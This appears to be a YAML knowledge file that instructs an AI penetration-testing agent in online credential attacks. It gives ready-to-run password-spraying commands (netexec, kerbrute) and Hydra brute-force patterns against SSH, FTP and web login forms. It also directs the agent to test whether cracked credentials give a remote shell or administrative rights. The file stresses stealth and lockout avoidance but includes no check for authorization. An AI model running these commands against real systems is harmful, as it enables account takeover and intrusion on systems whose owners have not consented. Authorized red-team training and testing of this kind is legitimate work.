knowledge: |
  Conduct online credential attacks with senior red-team stealth, lockout awareness, and strict task concurrency.

  1. ACCOUNT LOCKOUT AWARENESS & SPRAYING DOCTRINE:
     - Online brute-forcing carries severe operational risk of account lockouts and service disruption.
     - In Active Directory, Windows Domain, or enterprise IAM environments, NEVER run high-volume matrix attacks (user_list x pass_list).
     - Password Spraying (The Safe Standard):
       Test 1 single high-probability password across an enumerated list of usernames, then wait or finish:
       `netexec smb <target> -u $USERNAMES -p 'SeasonYear!' --continue-on-success`
       or Kerberos pre-auth validation:
       `kerbrute passwordspray -d <domain> --dc <dc_ip> $USERNAMES 'Password123!'`

  2. HYDRA OPERATIONAL DISCIPLINE & CRITICAL FLAGS:
     - Mandatory Stop-On-Success (`-f`):
       Always pass `-f` so Hydra terminates instantly upon discovering the first valid credential pair.
     - Concurrency and Rate Restraint:
       Use `-t 4` (or `-t 8` for dedicated local labs). Excessive thread counts trigger connection drops, server-side rate limits, or socket exhaustion.
     - Common Service Command Patterns:
       • SSH: `hydra -l <username> -P $PASSWORDS_TOP <target> ssh -t 4 -f`
       • FTP: `hydra -l <username> -P $PASSWORDS_TOP <target> ftp -t 4 -f`
       • Web Form: `hydra <target> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -l <username> -P $PASSWORDS_TOP -f`

  3. WORDLIST SELECTION & WORKBENCH ASSETS:
     - `$PASSWORDS_TOP` (top 1000): Use for fast initial baseline probes against common administrative accounts.
     - `$USERNAMES`: Use for user validation and spraying.
     - `$ROCKYOU`: Reserved strictly for offline hash cracking (e.g. John the Ripper or Hashcat). NEVER pipe $ROCKYOU into online network services across a socket.

  4. FINDINGS VERIFICATION & PRIVILEGE CHECK:
     - Record target host, port, protocol, and confirmed valid username.
     - Once valid credentials are confirmed, immediately test whether they grant remote shell execution (e.g. SSH login) or administrative rights.
